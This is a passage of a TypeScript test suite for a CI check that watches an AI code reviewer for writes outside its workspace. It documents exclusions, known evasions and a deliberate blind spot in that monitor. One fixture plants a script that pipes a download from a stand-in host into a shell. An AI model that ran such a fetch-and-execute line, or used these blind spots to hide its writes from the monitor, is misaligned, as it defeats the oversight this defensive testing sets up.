  // `/home/gharunner/runner-*/_diag/*` or `/home/gharunner/actions-runner/_diag/*`,
  // and the job itself ran on `runner-4` while the list named runner-2, -3,
  // -5, -7, -9 and `actions-runner`. Six SIBLING processes, building other
  // repositories, concurrently. Not one of the 30 is the reviewer, there is
  // no run in which they are absent, and no correct pull request can clear
  // them (#877).
  //
  // THE CHEAPEST WRONG FIX, named before the repair: drop
  // `AI_REVIEW_OUTSIDE_MAXDEPTH` from 4 to 2. The 30 paths sit at depth 3 and
  // 4, so they all vanish and the gate goes green. It is wrong because it
  // trades a false positive for blindness at exactly the depth a real write
  // sits — and the real write #843 finding 1 is about, a reviewer reaching
  // into another repository's checkout on the same host, is
  // `$HOME/<sibling-runner>/_work/<other-repo>/<file>` at depth 4.
  //
  // AC-15c is the case that does not survive it, and it is the reason this
  // block subtracts `_diag` rather than subtracting sibling runners
  // wholesale: a sibling's `_work` is another repository's source tree, so a
  // write there is the finding, not the floor.
  describe("AC-15 (#877): a sibling runner's diagnostics are subtracted, its checkout is not", () => {
    test("the runner-diagnostic list is the measurement, and the cases below are generated from it", () => {
      // The pin, for the reason the two above it exist: the per-entry cases
      // are generated from this list, so emptying it DELETES them rather
      // than reddening them.
      expect([...AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS]).toEqual(["*/_diag", "*/_work/_temp"]);
    });

    test("it is disjoint from both runtime lists, and nests with neither", () => {
      // A third list is a third thing that can collide with the other two.
      // `*/_diag` shares no prefix with anything under `.claude`, `.npm` or
      // `.bun` — asserted rather than eyeballed, because the next entry
      // somebody adds here is the one that will.
      const diag = [...AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS];
      const others = [...AI_REVIEW_RUNTIME_INERT_PATHS, ...AI_REVIEW_RUNTIME_CONFIG_PATHS];
      expect(diag.filter(p => others.includes(p)), "a path is in two lists").toEqual([]);
      const nested = (a: string, b: string) => b === a || b.startsWith(`${a}/`);
      expect(
        diag.flatMap(d => others.filter(o => nested(d, o) || nested(o, d)).map(o => `${d} ~ ${o}`)),
        "the runner-diagnostic list nests with a runtime list",
      ).toEqual([]);
    });

    for (const [name, rel] of [
      // Depth 3: `$HOME/runner-3/_diag/Runner_<utc>.log`, the shape most of
      // the 30 took.
      ["a sibling runner's log", join("runner-3", "_diag", "Runner_20261020-225157-utc.log")],
      // Depth 4: the `blocks/` and `pages/` entries, which is why the
      // subtraction cannot be a single-level one.
      ["a sibling runner's paged log", join("runner-4", "_diag", "pages", "2123a4b4-545928fe_1.log")],
      // The runner that is not numbered. The pool's tenth is called
      // `actions-runner`, so a subtraction keyed on `runner-<n>` would miss
      // it — which is why the entry names `_diag` and not the parent.
      ["the unnumbered runner's log", join("actions-runner", "_diag", "Worker_20261021-074555-utc.log")],
      // #897, depth 4. The three paths run `39605785223` refused with, under
      // `runner-4` while the job ran on `runner-5`. `_work/_temp` is where the
      // Actions runner materialises the `<uuid>.sh` script for each `run:`
      // step of whatever job it is executing — written continuously, by
      // design, by a process that is definitionally not the reviewer, which
      // is word for word the `_diag` argument above.
      ["a sibling runner's step script", join("runner-4", "_work", "_temp", "a7b08f96-aaf0-41b2-a288-d87e7bd1029f.sh")],
      // The unnumbered runner again: the pool's tenth has a `_work/_temp` too,
      // so the entry names the suffix and not the parent for the same reason.
      ["the unnumbered runner's step script", join("actions-runner", "_work", "_temp", "2a8376b4-2a57-43df-8086-90229411a7d1.sh")],
    ] as const) {
      test(`AC-15a: ${name} is exit 0 and SILENT`, () => {
        const f = fixture();
        const { path, sha } = runBaseline(f);
        const target = join(f.home, rel);
        mkdirSync(join(target, ".."), { recursive: true });
        writeFileSync(target, "runner diagnostics\n");
        const r = runDrift(f, path, sha);
        const text = r.stdout + r.stderr;
        expect(r.code, `${rel} is runner diagnostics and refused:\n${r.stderr}`).toBe(0);
        expect(text).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
        // Silent, not merely unrefused. A runner log annotated as runtime
        // config would be a reading nobody can act on, fired every run.
        expect(text, `${rel} was reported as runtime config`).not.toContain(CONFIG_UNMEASURED_TEXT);
      });
    }

    test("AC-15c: a sibling runner's CHECKOUT still refuses, and is named", () => {
      // The witness against the maxdepth repair, and against subtracting
      // sibling runner trees wholesale. `$HOME/runner-9/_work/other-repo/x.ts`
      // is depth 4 — inside the bound — and it is another repository's source
      // tree on the same host, which is #843 finding 1 verbatim.
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, "runner-9", "_work", "other-repo", "payload.ts");
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "export const owned = 1;\n");
      const r = runDrift(f, path, sha);
      expect(r.code, "a write into a sibling runner's checkout was not refused").not.toBe(0);
      expect(r.stderr).toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
      expect(r.stderr, "the refusal does not name the sibling checkout write").toContain(target);
    });

    test("AC-15d: a runner log beside an unlisted write refuses, and only the unlisted one is named", () => {
      // The discrimination case. A subtraction that silenced the whole walk
      // would pass AC-15a and this is the input that tells the two apart.
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const log = join(f.home, "runner-7", "_diag", "Worker_20261021-074446-utc.log");
      mkdirSync(join(log, ".."), { recursive: true });
      writeFileSync(log, "runner diagnostics\n");
      const escaped = join(f.home, "escaped.sh");
      writeFileSync(escaped, "#!/bin/sh\necho owned\n");

      const r = runDrift(f, path, sha);
      expect(r.code, "the unlisted write was not refused").not.toBe(0);
      const refusal = r.stderr.slice(r.stderr.indexOf(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`));
      const line = refusal.slice(0, refusal.indexOf("\n"));
      expect(line, "the refusal does not name the unlisted write").toContain(escaped);
      // Compared against the ABSOLUTE path for AC-14's reason: the refusal's
      // prose enumerates what it subtracted, so a search for `_diag` over the
      // message matches the sentence rather than the finding.
      expect(line, "a runner diagnostic reached the refusal").not.toContain(log);
    });

    test("AC-15f: a _diag DEEPER than the runner install directory still refuses", () => {
      // The anchor, and the reason this list is not emitted with the shared
      // two-predicate form. `find -path` globs are fnmatch without
      // FNM_PATHNAME, so a star matches a slash: an unanchored
      // `$HOME/*/_diag/*` subtracts a `_diag` at ANY depth, and a reviewer
      // that wants a write unseen only has to name a directory. Inside the
      // depth bound, `$HOME/<runner>/_work/_diag/<file>` is that bypass.
      //
      // Raised by the automated security review of this branch's first push,
      // whose emission had exactly that hole.
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, "runner-9", "_work", "_diag", "payload.ts");
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "export const owned = 1;\n");
      const r = runDrift(f, path, sha);
      expect(r.code, "a _diag below the runner work root was subtracted").not.toBe(0);
      expect(r.stderr, "the refusal does not name the deeper _diag write").toContain(target);
    });

    test("AC-15g (#897): a sibling path that merely STARTS with _temp still refuses", () => {
      // The prefix boundary for the `_work/_temp` entry. `find -path` is
      // fnmatch, so the entry's trailing component is literal and
      // `_work/_tempest/` must not satisfy `_work/_temp/` — but that is a
      // property of the emitted string, and the emitted string is what this
      // whole file exists to not take on trust.
      //
      // This is the reachable bypass case for the entry, and AC-15f's shape
      // is NOT: one extra component in front of `<runner>/_work/_temp/<file>`
      // puts it at depth 5, outside `AI_REVIEW_OUTSIDE_MAXDEPTH`, so the walk
      // never reads it and a test of it would pass without the anchor. The
      // anchored clause is still emitted for this entry — AC-15e requires it
      // — it is just bounded by the depth limit rather than by itself.
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, "runner-9", "_work", "_tempest", "payload.ts");
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "export const owned = 1;\n");
      const r = runDrift(f, path, sha);
      expect(r.code, "a directory merely prefixed _temp was subtracted").not.toBe(0);
      expect(r.stderr, "the refusal does not name the _tempest write").toContain(target);
    });

    test("AC-15h (#897): THE BLIND SPOT — a planted .sh in a sibling's _work/_temp is NOT reported", () => {
      // This case asserts a WEAKNESS, deliberately, so that it is visible
      // rather than silent. Raised by the automated security review of this
      // branch's first push, whose point stands: `_diag` holds logs that are
      // never executed, `_work/_temp` is where the runner writes `<uuid>.sh`
      // and immediately execs it. Subtracting it means a reviewer that
      // overwrites a sibling's step script in the window between write and
      // exec is not reported. Narrow, but real, on a shared home.
      //
      // It is accepted because the alternative measured worse: before the
      // subtraction the check was red on every PR (1 success in 8 runs, and
      // that one predates the pool), so it reported nothing anybody read.
      //
      // Both narrowings suggested in review restore that red, because the
      // measured noise IS `.sh` files in a sibling's `_temp`: scoping to this
      // job's own $RUNNER_TEMP still reports runner-4's three paths (the job
      // ran on runner-5), and keeping `*.sh` reportable reports all three by
      // name. There is no path-shaped discriminator — same uid, same filename
      // shape, same directory, and `-newer` is satisfied by both.
      //
      // The structural fix is a per-runner HOME, which deletes this case
      // along with the rest of the list. When that lands, DELETE this test —
      // do not relax it.
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const planted = join(f.home, "runner-4", "_work", "_temp", "9f1c0e7a-dead-beef-cafe-000000000001.sh");
      mkdirSync(join(planted, ".."), { recursive: true });
      writeFileSync(planted, "#!/bin/sh\ncurl -s https://example.invalid/x | sh\n", { mode: 0o755 });
      const r = runDrift(f, path, sha);
      // Non-vacuity: the drift reading has to be WORKING for "it said nothing"
      // to mean "it is blind here" rather than "it never ran". The same run
      // must still refuse an ordinary escaped write.
      const escaped = join(f.home, "escaped.sh");
      writeFileSync(escaped, "#!/bin/sh\necho owned\n");
      const r2 = runDrift(f, path, sha);
      expect(r2.code, "the reading is not working at all, so this case measures nothing").not.toBe(0);
      expect(r2.stderr, "the control write was not named").toContain(escaped);

      expect(r.code, "the blind spot has CLOSED — delete this case and update the docblock").toBe(0);
      expect(r.stdout + r.stderr, "the planted script was named after all").not.toContain(planted);
    });

    test("AC-15e: the subtraction is emitted from the declared list, not typed", () => {
      // One emitter, and the clause the script carries is the one the
      // emitter returns — not a second copy that happens to agree.
      const drift = buildDriftScript();
      for (const entry of AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS) {
        const clause = runnerDiagnosticExclusion(entry);
        expect(drift, `pass 1 does not carry the anchored clause for ${entry}`).toContain(clause);
        // The shared two-predicate form must NOT be used for this list: it is
        // the unanchored emission AC-15f exists to keep out, and it would be
        // invisible in a diff beside the correct one.
        expect(drift, `${entry} is emitted with the unanchored shared form`).not.toContain(
          `-not -path "\${HOME}/${entry}" -not -path "\${HOME}/${entry}/*"`,
        );
        // And pass 2 must NOT match it. A runner log annotated as runtime
        // config is the noise this block exists to remove, arriving under a
        // different title.
        expect(drift, `pass 2 matches ${entry}, so a runner log is annotated`).not.toContain(
          `      -o -path "\${HOME}/${entry}"`,
        );
      }
    });
  });

  test("AC-9: the shapes a literal allowlist could not hold read CLEAN", () => {
    // Four of the twelve paths in the measured floor carry a uuid, an epoch
    // or an ISO timestamp, and a fifth is intermittent. These are the reason
    // the subtraction is a prefix list and not a path list, so they are a
    // case rather than a sentence.
    //
    // Two of the four are inert and two are config, so the run is also the
    // pair that shows the split surviving a variable component: all four are
    // exit 0, and exactly the config two are named.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    const INERT_SHAPES = [
      ".claude/projects/-a-slug/5d4ec1e2-fb26-49f0-8abb-f81860933538.jsonl",
      ".npm/_logs/2026-10-21T04_48_39_043Z-debug-0.log",
    ];
    const CONFIG_SHAPES = [
      ".claude/backups/.claude.json.backup.1792558105498",
      ".claude/plugins/plugin-directory-cache-v2.json",
    ];
    for (const rel of [...INERT_SHAPES, ...CONFIG_SHAPES]) {
      const target = join(f.home, rel);
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "x");
    }
    const r = runDrift(f, path, sha);
    expect(r.code, `a variable-component runtime path refused the review:\n${r.stderr}`).toBe(0);

    const text = r.stdout + r.stderr;
    const annotation = text.slice(text.indexOf(CONFIG_UNMEASURED_TEXT));
    for (const rel of CONFIG_SHAPES) {
      expect(annotation, `${rel} is trust-bearing and was subtracted in silence`).toContain(rel);
    }
    for (const rel of INERT_SHAPES) {
      expect(text, `${rel} is inert state and was annotated as runtime config`).not.toContain(rel);
    }

    // The control. Four writes that are all excluded is indistinguishable
    // from a walk that found nothing — a broken `find`, an unset HOME, a
    // baseline newer than everything. One unexcluded write in the same run
    // proves the reading was taken.
    writeFileSync(join(f.home, ".claudette-not-the-runtime"), "x");
    const again = runDrift(f, path, sha);
    expect(
      again.code,
      "the reading found nothing at all, so the four CLEAN readings above are UNMEASURED",
    ).not.toBe(0);
    expect(again.stderr).toContain(".claudette-not-the-runtime");
  });

  test("AC-11: both readings refuse, and the tree comparison is the one that names the file", () => {
    // The outside block runs BEFORE the tree comparison on purpose — the
    // comparison exits 0 the moment the tree is clean, and a clean tree is
    // exactly the run in which an escaped write is the whole story. Making
    // it exit where it reads would mean a reviewer that did both got the
    // less specific diagnostic, so the annotation is emitted there and the
    // EXIT is deferred. That ordering is a behaviour, so it is a case.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    writeFileSync(join(f.home, "escaped.sh"), "#!/bin/sh\necho owned\n");
    writeFileSync(join(f.work, "tracked.ts"), "export const a = 2;\n");
    const r = runDrift(f, path, sha);

    expect(r.code, `a run that did both was not refused:\n${r.stdout}${r.stderr}`).not.toBe(0);
    expect(r.stderr, "the outside reading was swallowed by the tree refusal").toContain(
      `::error title=${AI_REVIEW_OUTSIDE_TITLE}`,
    );
    expect(r.stderr, "the tree refusal never ran — the outside reading exited first").toContain(
      `::error title=${AI_REVIEW_DRIFT_TITLE}`,
    );
    expect(r.stderr, "the refusal does not name the file the reviewer changed").toContain("tracked.ts");

    // The control for the deferral, which the case above cannot give: with
    // the tree clean, the outside reading has to carry the refusal on its
    // own. Without this, moving the exit back to the reading site changes
    // no verdict here.
    const g = fixture();
    const b = runBaseline(g);
    writeFileSync(join(g.home, "escaped.sh"), "#!/bin/sh\necho owned\n");
    const clean = runDrift(g, b.path, b.sha);
    expect(clean.code, "a clean tree with an escaped write was not refused").not.toBe(0);
    expect(clean.stderr).not.toContain(`::error title=${AI_REVIEW_DRIFT_TITLE}`);
  });

  test("AC-10: both passes are interpolated from the declared lists, not typed", () => {
    // Two shapes per entry — the path itself and everything under it — and
    // nothing else. A hand-written extra exclusion is a second declaring
    // position for a list whose whole value is that there is one.
    const script = buildDriftScript();
    // The runner-diagnostic list is NOT in `both`: it is emitted by its own
    // anchored clause rather than the shared two-predicate form (#877), so it
    // contributes four `-path` terms and no `-not -path` ones. The arithmetic
    // below counts them explicitly — a list left out of the accounting is a
    // list whose terms could be anything.
    const both = [...AI_REVIEW_RUNTIME_INERT_PATHS, ...AI_REVIEW_RUNTIME_CONFIG_PATHS];
    // Without this the loops below run zero times against empty lists and the
    // counts compare 0 to 0 — the assertions hold vacuously, in the case
    // whose whole job is to hold the lists to what the script emits.
    expect(
      AI_REVIEW_RUNTIME_INERT_PATHS.length,
      "the inert list is empty, so everything below this line asserts nothing",
    ).toBeGreaterThan(0);
    expect(
      AI_REVIEW_RUNTIME_CONFIG_PATHS.length,
      "the config list is empty, so everything below this line asserts nothing",
    ).toBeGreaterThan(0);
    expect(
      AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS.length,
      "the runner-diagnostic list is empty, so everything below this line asserts nothing",
    ).toBeGreaterThan(0);

    // Pass 1 excludes ALL THREE lists: neither a config path nor a runner
    // diagnostic may reach the refusal. One clause for a declared file, two
    // for a directory (#931) — the `/*` clause at a file-shaped entry is
    // what AC-18 plants a directory into.
    const isFile = (e: string) => AI_REVIEW_FILE_SHAPED_PATHS.includes(e);
    for (const entry of both) {
      expect(script, `${entry} is declared but not excluded from the refusal`).toContain(
        isFile(entry)
          ? `-not -path "\${HOME}/${entry}" \\`
          : `-not -path "\${HOME}/${entry}" -not -path "\${HOME}/${entry}/*"`,
      );
    }
    const excluded = (script.match(/-not -path "\$\{HOME\}\//g) || []).length;
    expect(
      excluded,
      "an exclusion under $HOME is in the script that no declared list names",
    ).toBe(both.filter(e => !isFile(e)).length * 2 + both.filter(isFile).length);

    // Pass 2 MATCHES the config list, and only it. Counting the positive
    // terms separately is what stops an inert path being annotated: a
    // thirteenth `-path` under $HOME that is not `-not` would be one.
    for (const entry of AI_REVIEW_RUNTIME_CONFIG_PATHS) {
      expect(script, `${entry} is trust-bearing but pass 2 does not match it`).toContain(
        isFile(entry)
          ? `-path "\${HOME}/${entry}" \\`
          : `-path "\${HOME}/${entry}" -o -path "\${HOME}/${entry}/*"`,
      );
    }
    const allPathTerms = (script.match(/-path "\$\{HOME\}\//g) || []).length;
    // Pass 2's positive terms, plus the runner-diagnostic clause's four per
    // entry — two for the shallow shape it subtracts and two for the deeper
    // shape it refuses to subtract.
    expect(
      allPathTerms - excluded,
      "a -path term under $HOME is in the script that no declared list accounts for",
    ).toBe(
      AI_REVIEW_RUNTIME_CONFIG_PATHS.filter(e => !isFile(e)).length * 2 +
        AI_REVIEW_RUNTIME_CONFIG_PATHS.filter(isFile).length +
        AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS.length * 4,
    );
  });
});

// ── AC-16: the reviewer's own session state ─────────────────────────────

/**
 * #907 is the same shape as #877 and #897, one owner further out.
 *
 * The three lists above were derived from ONE runtime and ONE runner process
 * on an ephemeral home. A consumer's self-hosted pool shares `/home/gharunner`
 * across many runner processes, and anything writing there on its own schedule
 * lands in a reading that attributes the write to the reviewer. `_diag` was
 * the third owner, `_work/_temp` the fourth, this is the fifth.
 *
 * Measured on a real consumer whose ai-review was 0 of 18 at the time of
 * filing. The runs are cited per case below.
 *
 * WHY THIS ONE DOES NOT GO AWAY. #913 added a sixth owner — a sibling Copilot
 * runtime on the same pool — and #946 removed it again once the workflows
 * driving that CLI were deleted and the paths had no writer left. This owner
 * is different in kind: `.claude/sessions` is written by the REVIEWER ITSELF.
 * `AI_REVIEW_MODE: vertex` runs the Claude CLI, and the CLI writes session
 * state on every start, so the job taking the reading is the job making the
 * write. There is no deletion that retires this entry — only #904.
 */
describe("AC-16 (#907): the CLI's own session state is not the reviewer's write", () => {
  // Runs `39620098295` (asaCommandCenter#1769) and `39620105739` (#1817):
  // 35 and 33 refused paths, of which 4 each are these two shapes. They were
  // in the `::error` list that fails the job, not the `::warning` list.
  const SESSION_JSON = ".claude/sessions/1214993.json";
  const SESSION_KEY =
    ".claude/sessions/1187153." +
    "0f3a1c7e5b9d2486af01c3e7d59b8426ff7a0d13c6e58b92a4017de3cb56f8a2.key";

  for (const entry of [SESSION_JSON, SESSION_KEY]) {
    test(`a write at ${entry.split("/").pop()} is exit 0 AND named UNMEASURED`, () => {
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, entry);
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "session state\n");
      const r = runDrift(f, path, sha);
      const text = r.stdout + r.stderr;
      expect(r.code, `${entry} is runtime session state and refused:\n${r.stderr}`).toBe(0);
      expect(text).not.toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
      // The conjunction is the behaviour, for #871's reason: exit 0 alone is
      // satisfied by subtracting the directory in silence, and silence is the
      // wrong answer at a path where a credential can be dropped.
      expect(
        text,
        `${entry} was subtracted silently — a session key is trust-bearing and must be named`,
      ).toContain(CONFIG_UNMEASURED_TEXT);
    });
  }

  test("THE MUTANT #907 asked for: a reviewer-planted session file is still NAMED", () => {
    // #907's own suggested check. The failure it guards is a subtraction that
    // makes the whole directory disappear from the reading: exit 0 with no
    // annotation, which is indistinguishable from a run where nothing was
    // written there at all. Classifying `.claude/sessions` as CONFIG rather
    // than INERT is what keeps the plant visible, and this is the case that
    // tells the two classifications apart — it passes under CONFIG and fails
    // under INERT, where every other case in this block passes under both.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    const target = join(f.home, ".claude/sessions/attacker.json");
    mkdirSync(join(target, ".."), { recursive: true });
    writeFileSync(target, '{"planted":true}\n');
    const r = runDrift(f, path, sha);
    const text = r.stdout + r.stderr;
    expect(r.code).toBe(0);
    expect(
      text,
      "a planted session file vanished from the reading entirely",
    ).toContain(CONFIG_UNMEASURED_TEXT);
    expect(text, "the planted path is not named in the annotation").toContain("attacker.json");
  });
});


// ── AC-18: a directory where the measurement saw a file ──────────────────

/**
 * The emitter writes TWO shapes for every entry — `${HOME}/<e>` and
 * `${HOME}/<e>/*` — and the comment beside it called the second "simply a
 * no-op against `.claude.json`". That is true only while a FILE is what sits
 * there. Nothing stops a directory existing at a file-shaped path, and the
 * `/*` clause then exempts everything inside it.
 *
 * Measured on this suite before the fix, one planted `evil.sh` per entry:
 *
 * | entry | exit | named? |
 * |---|---|---|
 * | `.claude.json` | 0 | yes — pass 2 matches it |
 * | `.claude/settings.json` | 0 | yes |
 * | `.copilot/mcp-config.json` | 0 | yes |
 * | `.copilot/session-store.db` | 0 | **no** |
 * | `.copilot/session-store.db-wal` | 0 | **no** |
 *
 * The three `.copilot` rows are kept as the record of what was measured; the
 * entries themselves were removed in #946 once their writer was deleted. The
 * bypass they exposed is the reason this block exists and applies unchanged
 * to the three entries that remain.
 *
 * So the hole pre-dates #913 for the CONFIG entries, where pass 2 at least
 * NAMES the plant in the UNMEASURED annotation. It is the INERT entries that
 * are silent, and #922 added the first file-shaped ones. Both halves are
 * fixed here rather than only the half that is new, because a named bypass
 * is still a bypass and the two share one emitter.
 *
 * The fix is to stop emitting the `/*` clause for an entry declared to be a
 * file. `AI_REVIEW_FILE_SHAPED_PATHS` is that declaration, and the case at
 * the bottom of this block refuses an entry that is in neither shape — an
 * entry nobody classified would otherwise silently keep the old behaviour.
 */
describe("AC-18 (#931): a DIRECTORY at a file-shaped entry does not exempt its contents", () => {
  for (const entry of [
    ".claude.json",
    ".claude/settings.json",
    ".claude/.last-cleanup",
  ]) {
    test(`a plant inside a directory at ${entry} still REFUSES`, () => {
      const f = fixture();
      const { path, sha } = runBaseline(f);
      const target = join(f.home, entry, "evil.sh");
      mkdirSync(join(target, ".."), { recursive: true });
      writeFileSync(target, "#!/bin/sh\necho pwned\n");
      const r = runDrift(f, path, sha);
      const text = r.stdout + r.stderr;
      expect(
        r.code,
        `a directory at ${entry} exempted its contents — the subtraction was written for a file`,
      ).toBe(1);
      expect(text).toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
      expect(text, "the planted path is not named").toContain("evil.sh");
    });
  }

  test("every declared entry is classified as a file or a directory", () => {
    // Without this, a new entry defaults to directory-shaped and gets the
    // `/*` clause back. The default is the defect, so there is no default.
    const all = [...AI_REVIEW_RUNTIME_INERT_PATHS, ...AI_REVIEW_RUNTIME_CONFIG_PATHS];
    const files = new Set(AI_REVIEW_FILE_SHAPED_PATHS);
    for (const e of AI_REVIEW_FILE_SHAPED_PATHS) {
      expect(all, `${e} is declared file-shaped but is in neither path list`).toContain(e);
    }
    // The directory-shaped ones are the remainder, and are named here so the
    // split is readable rather than a subtraction the reader has to perform.
    expect(all.filter(e => !files.has(e))).toEqual([
      ".claude/cache",
      ".claude/projects",
      ".npm/_logs",
      ".bun/install/cache",
      ".claude/plugins",
      ".claude/backups",
      ".claude/state",
      ".claude/sessions",
      ".npm/_npx",
    ]);
  });

  test("a file-shaped entry emits ONE clause, not two", () => {
    // The source-level half. The behavioural cases above would also pass if
    // the `/*` clause were kept and something else refused the plant, and
    // this is the case that says which mechanism did it.
    const script = buildDriftScript();
    for (const e of AI_REVIEW_FILE_SHAPED_PATHS) {
      expect(script, `${e} is a file and still gets the directory clause`).not.toContain(
        `-not -path "\${HOME}/${e}/*"`,
      );
      expect(script, `${e} lost its own exclusion`).toContain(`-not -path "\${HOME}/${e}"`);
    }
  });
});

// ── AC-5 / AC-6: unmeasured states, and the allowlist that must not exist ─

describe("AC-5 (#843/1): a reading that could not be taken says so", () => {
  test("no usable HOME: UNMEASURED, and the tree comparison still runs", () => {
    const f = fixture();
    const { path, sha } = runBaseline(f);
    const r = sh(buildDriftScript(), f.work, {
      AI_REVIEW_MODE: "vertex",
      HOME: "",
      RUNNER_TEMP: f.runnerTemp,
      GITHUB_WORKSPACE: f.work,
      [AI_REVIEW_TREE_BEFORE_VAR]: path,
      [AI_REVIEW_TREE_BEFORE_SHA_VAR]: sha,
    });
    expect(r.stdout + r.stderr).toContain(`::warning title=${AI_REVIEW_UNMEASURED_TITLE}`);
    expect(r.code, "a run with no HOME was refused outright").toBe(0);

    // And the comparison it sits beside is unaffected: an in-tree write is
    // still caught. Without this half, deleting the whole drift step would
    // leave the case above green.
    writeFileSync(join(f.work, "evil.ts"), "x\n");
    const drifted = sh(buildDriftScript(), f.work, {
      AI_REVIEW_MODE: "vertex",
      HOME: "",
      RUNNER_TEMP: f.runnerTemp,
      GITHUB_WORKSPACE: f.work,
      [AI_REVIEW_TREE_BEFORE_VAR]: path,
      [AI_REVIEW_TREE_BEFORE_SHA_VAR]: sha,
    });
    expect(drifted.code).not.toBe(0);
    expect(drifted.stderr).toContain(`::error title=${AI_REVIEW_DRIFT_TITLE}`);
  });

  test("AC-7: what the depth bound COSTS, asserted rather than described", () => {
    // Not a property anyone wants — it is the price of `-maxdepth`, and an
    // unbounded walk is not shippable (the same step over a developer's home
    // had not finished after ten minutes). A limit written only in prose is
    // a limit nobody re-measures when the number changes, so it is a case.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    const deep = join(f.home, "a", "b", "c", "d", "e");
    mkdirSync(deep, { recursive: true });
    writeFileSync(join(deep, "too-deep.bin"), "x");
    const r = runDrift(f, path, sha);
    expect(
      r.stdout + r.stderr,
      `AI_REVIEW_OUTSIDE_MAXDEPTH is ${AI_REVIEW_OUTSIDE_MAXDEPTH}; if the bound was raised, ` +
        `move this fixture deeper rather than deleting the case`,
    ).not.toContain("too-deep.bin");

    // The control, without which this is satisfied by a reading that found
    // nothing at all: a file inside the bound, in the same run.
    writeFileSync(join(f.home, "shallow.bin"), "x");
    const again = runDrift(f, path, sha);
    expect(again.stdout + again.stderr).toContain("shallow.bin");
    expect(again.stdout + again.stderr).not.toContain("too-deep.bin");
  });

  test("AC-6: a path no allowlist would name is still reported", () => {
    // The cheapest wrong fix, refused by a case rather than by a comment:
    // when the full $HOME walk turns out noisy, scope it to ~/.ssh, ~/.config
    // and friends. The finding's own example is an `auth.json` left in
    // gharunner's home by an unrelated job; nobody predicts the next name.
    const f = fixture();
    const { path, sha } = runBaseline(f);
    const odd = join(f.home, "zz-nobody-would-list-this");
    mkdirSync(odd, { recursive: true });
    writeFileSync(join(odd, "payload.bin"), "x");
    const r = runDrift(f, path, sha);
    expect(r.stdout + r.stderr).toContain(`::error title=${AI_REVIEW_OUTSIDE_TITLE}`);
    expect(r.stdout + r.stderr).toContain("payload.bin");
  });
});
